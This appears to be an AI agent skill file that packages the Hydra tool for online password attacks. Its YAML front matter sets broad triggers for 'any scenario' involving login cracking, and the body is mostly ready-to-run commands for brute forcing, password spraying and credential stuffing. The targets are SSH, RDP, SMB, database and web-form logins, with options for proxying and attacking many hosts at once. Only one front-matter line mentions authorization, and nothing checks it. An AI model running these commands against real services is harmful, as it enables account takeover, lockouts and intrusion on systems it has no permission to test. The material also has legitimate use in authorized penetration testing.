---
name: hydra-brute
description: "Online password brute forcing with Hydra. Use when you need to brute force, spray passwords, or credential stuff against services such as SSH/FTP/HTTP/SMB/RDP/MySQL/MSSQL. Hydra is the most classic online brute-forcing tool, supporting 50+ protocols. Any scenario involving online password brute forcing, login cracking, or protocol fuzzing should use this skill"
zh-signals: "使用 Hydra 对 SSH/FTP/HTTP/SMB/RDP/MySQL 等服务进行在线密码爆破与密码喷洒。信号:Hydra,暴力破解,密码爆破,密码喷洒,凭据填充"
when-to-use: "Use when you need to perform authorized online password brute-force or password spraying against services such as SSH, FTP, HTTP, SMB, RDP, MySQL, or MSSQL."
metadata:
  tags: "hydra,brute,password,brute-force,password-cracking,SSH,FTP,HTTP,SMB,RDP,MySQL,password-spraying,credential-stuffing"
  category: "tool"
---

# Hydra Online Password Brute Forcing Methodology

Hydra (THC-Hydra) is the most classic online brute-forcing tool. Core strengths: **broad protocol coverage** (50+ protocols) + **flexible configuration** (supports user/password lists, one user with many passwords, many users with one password) + **high speed** (multi-threaded concurrency).

Project URL: https://github.com/vanhauser-thc/thc-hydra

## Phase 1: Basic Brute Forcing

```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://target.com

# FTP brute force
hydra -l root -P passwords.txt ftp://target.com

# SMB brute force
hydra -l administrator -P passwords.txt smb://target.com

# RDP brute force
hydra -l administrator -P passwords.txt rdp://target.com

# MySQL brute force
hydra -l root -P passwords.txt mysql://target.com
```

## Phase 2: Username and Password Combinations

```bash
# Single user + password list
hydra -l admin -P top100.txt ssh://target

# User list + single password (password spraying)
hydra -L users.txt -p "P@ssw0rd" ssh://target

# User list + password list
hydra -L users.txt -P passwords.txt ssh://target

# username=password test
hydra -L users.txt -e nsr ssh://target
# n=null password, s=username as password, r=reversed username

# Credential file (user:pass format)
hydra -C creds.txt ssh://target
```

## Phase 3: HTTP Form Brute Forcing

```bash
# POST form brute force
hydra -l admin -P passwords.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"

# GET form brute force
hydra -l admin -P passwords.txt target http-get-form \
  "/login?user=^USER^&pass=^PASS^:F=fail"

# HTTPS form
hydra -l admin -P passwords.txt target https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=error"

# With Cookie
hydra -l admin -P passwords.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=fail:H=Cookie: session=abc"
```

## Phase 4: Advanced Options

```bash
# Specify a port
hydra -l admin -P passwords.txt -s 2222 ssh://target

# Control the number of threads (default 16)
hydra -l admin -P passwords.txt -t 4 ssh://target

# Control the wait time
hydra -l admin -P passwords.txt -w 5 ssh://target

# Output to file
hydra -l admin -P passwords.txt -o results.txt ssh://target

# Resume an interrupted attack
hydra -R

# Verbose output
hydra -l admin -P passwords.txt -V ssh://target

# Use a proxy (HYDRA_PROXY_HTTP for the HTTP module; HYDRA_PROXY for non-HTTP modules such as SSH)
HYDRA_PROXY=socks5://127.0.0.1:1080 hydra -l admin -P passwords.txt ssh://target
```

## Common Penetration Testing Combinations

| Scenario | Command |
|------|------|
| Quick SSH test | `hydra -l root -P top100.txt -t 4 ssh://target` |
| Password spraying | `hydra -L users.txt -p "Company2024!" ssh://target` |
| Web login brute force | `hydra -l admin -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
| Database brute force | `hydra -l sa -P pass.txt mssql://target` |
| Bulk SSH | `hydra -L users.txt -P pass.txt -M targets.txt ssh` |
